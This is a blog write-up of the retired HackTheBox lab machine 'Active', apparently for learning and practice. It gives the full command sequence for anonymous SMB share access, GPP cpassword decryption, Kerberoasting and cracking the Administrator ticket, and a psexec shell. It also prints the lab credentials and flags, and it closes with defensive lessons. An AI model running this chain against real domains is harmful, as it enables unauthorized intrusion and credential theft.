---
title: "HTB Active — My First Real Active Directory Box"
date: 2026-05-07
categories: [HackTheBox, Active Directory]
tags: [htb, active-directory, smb, gpp, kerberoasting, windows]
layout: single
classes: wide
author_profile: true
---


**Difficulty:** Easy  
**OS:** Windows  
**IP:** 10.129.34.50  
**Status:** Retired 

---

## Overview

Active is a Windows machine centered around Active Directory specifically 
two classic attack techniques: **GPP password decryption** and **Kerberoasting**.
On the surface it looks like a standard AD environment, but dig into the SMB 
shares and things get interesting fast.

This was one of the first proper AD boxes I did and it taught me that 
misconfigurations from years ago can still be sitting on production systems 
waiting to be abused. 
---

## Enumeration

### Nmap

```bash
nmap -sV -sS -A -T4 -Pn 10.129.34.50
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
                              (Domain: active.htb)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
```

Classic AD port layout. Port 88 (Kerberos), 389 (LDAP), 445 (SMB) — 
we're dealing with a Domain Controller running **Windows Server 2008 R2**.

The domain is `active.htb` — add that to `/etc/hosts` first.

```bash
echo "10.129.34.50 active.htb" | sudo tee -a /etc/hosts
```
Sometimes i prefer nano...just because
---

### SMB Enumeration

```bash
nxc smb 10.129.34.50
```

```
SMB  10.129.34.50  445  DC  [*] Windows 7 / Server 2008 R2 Build 7601 x64
                              (name:DC) (domain:active.htb) 
                              (signing:True) (SMBv1:None) (Null Auth:True)
```

**Null Auth: True** — we can authenticate without credentials. 
Let's see what shares are accessible.

```bash
enum4linux -a -r -K 5000 10.129.34.50
```

The share enumeration output showed something useful:

```
//10.129.34.50/Replication   Mapping: OK   Listing: OK   Writing: N/A
```

Every other share was DENIED. But `Replication` is Open. Not suspicous at all..

---

## Initial Access

### Accessing the Replication Share

```bash
smbclient //10.129.34.50/Replication -N
```

```
Anonymous login successful
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
![SMB Replication share access](/assets/images/active-smb.png)

Downloaded everything recursively. Among all the files, one stood out 
immediately — `Groups.xml` in the Group Policy path:

```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/
MACHINE/Preferences/Groups/Groups.xml
```

---

### GPP Password — Our clue

```bash
cat Groups.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
        name="active.htb\SVC_TGS" image="2" 
        changed="2018-07-18 20:46:06">
    <Properties 
      action="U" 
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3x
                 UjTLfCuNH8pG5aSVYdYw/NglVmQ" 
      userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```
![GPP password decrypted](/assets/images/active-gpp.png)

And just like that we got a `cpassword` field for `SVC_TGS`.

_Sidenote_: This was a public cve that microsoft already patched(MS14-025). Meaning if this exploit were to work on your systems you might have to call in your sysadmin on monday morning

<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMHBvb2F1bW1xbXJtMnlzMWdremZ5eXEzaDZ0bG42cGZldXpybmd1YSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/JG2w01ZijEIFEuh5Dg/giphy.gif" 
     style="width: 100%; height: auto;" 
     alt="description">
Decrypt it with `gpp-decrypt`:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

```
GPPstillStandingStrong2k18
```

The password is literally named `GPPstillStandingStrong2k18`.  
Sure buddy😄

**Credentials obtained:**
```
Username: SVC_TGS
Password: GPPstillStandingStrong2k18
Domain:   active.htb
```

---

### User Flag

Verify the credentials and access the Users share:

```bash
smbclient //10.129.34.50/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
```

Navigate to the Desktop:

```
smb: \> cd SVC_TGS\Desktop
smb: \SVC_TGS\Desktop\> get user.txt
```

**User Flag:** `9b17ba88572e82c2f108fd594583f9ca` ✅

---

## Privilege Escalation

### Kerberoasting

With valid domain credentials, we can now attempt Kerberoasting.

**What is Kerberoasting?**  
Any authenticated domain user can request Kerberos service tickets for 
accounts that have an SPN (Service Principal Name) registered. These 
tickets are encrypted with the service account's password hash. We request 
the ticket, pull the hash offline, and crack it using tools like johntheripper or hashcat.
You would also need to set the modules right

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 \
    -dc-ip 10.129.34.50 \
    -request
```

```
ServicePrincipalName  Name           MemberOf  PasswordLastSet
--------------------  -------------  --------  ---------------
active/CIFS:445       Administrator            2018-07-18 15:06:40

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS:445*$a....[hash]....
```

The **Administrator** account itself has an SPN. Talk about jackpot.

---

### Cracking the Hash

```bash
hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$*Administrator...[hash]...:Ticketmaster1968
```

**Administrator password:** `Ticketmaster1968`

---

### Root Flag

Use `psexec` to get a shell as Administrator:

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.34.50
```

```
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag:** `5761a6a470e73db6b3ec291ee43b7f58` ✅

---

## Key Takeaways

**1. SYSVOL is public — always check it**  
The Replication share mirrors SYSVOL content. Even with minimal access,  
anyone can read it. Group Policy files have lived there for decades on 
some environments — misconfigurations from 2012 can still be sitting there.

**2. GPP passwords are always crackable**  
If you see a `cpassword` field in any `Groups.xml`, `Scheduledtasks.xml`, 
`Services.xml`, or similar GPP file — decrypt it immediately with `gpp-decrypt`.  
MS14-025 patched the creation of new GPP passwords but existing ones? 
Still there. Still crackable.

**3. Kerberoastable Administrator is game over**  
A service running as the built-in Administrator account with an SPN is 
a massive misconfiguration. Service accounts should be dedicated low-privilege  
accounts, never Administrator. The moment we kerberoasted this, it was done.

**4. Weak passwords fail even strong encryption**  
The Kerberos ticket uses strong encryption. Hashcat cracked it in seconds 
because `Ticketmaster1968` was in rockyou.txt. Algorithm strength means  
nothing against dictionary attacks on weak passwords.


*Written by 0x5h4q | 0x5h4q.github.io*
